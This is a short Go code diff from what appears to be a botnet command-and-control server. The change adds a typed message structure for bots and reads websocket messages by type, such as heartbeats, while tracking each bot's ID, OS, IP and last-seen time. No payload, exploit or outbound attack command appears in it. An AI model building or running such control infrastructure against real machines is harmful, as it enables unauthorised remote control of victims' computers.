@@ -15,11 +15,12 @@ import (
 type Bot struct {
 	mu sync.RWMutex
 
-	ID       string `json:"id"`
-	OS       string `json:"os"`
-	IP       string `json:"ip"`
-	LastSeen time.Time
-	Active   bool
+	ID         string `json:"id"`
+	OS         string `json:"os"`
+	IP         string `json:"ip"`
+	LastSeen   time.Time
+	Active     bool
+	BotMessage BotMessage
 	// Command Command
 }
 
@@ -27,6 +28,11 @@ type Bot struct {
 // 	Cmdname string
 // 	Result  string
 // }
+
+type BotMessage struct {
+	Type    string
+	Message string
+}
 
 type c2 struct {
 	bots map[string]*Bot
@@ -63,13 +69,13 @@ func (c *c2) connectBot(w http.ResponseWriter, r *http.Request) {
 	b.mu.Unlock()
 	fmt.Print(b.ID, b.IP, b.OS, b.LastSeen)
 	for {
-		var botmsg string
-		if err := wsjson.Read(ctx, con, &botmsg); err != nil {
+		// var botmsg string
+		if err := wsjson.Read(ctx, con, &b.BotMessage); err != nil {
 			log.Println(err)
 			return
 		}
 
-		switch botmsg {
+		switch b.BotMessage.Type {
 		case "heartbeat":
 			b.mu.Lock()
 			b.LastSeen = time.Now()
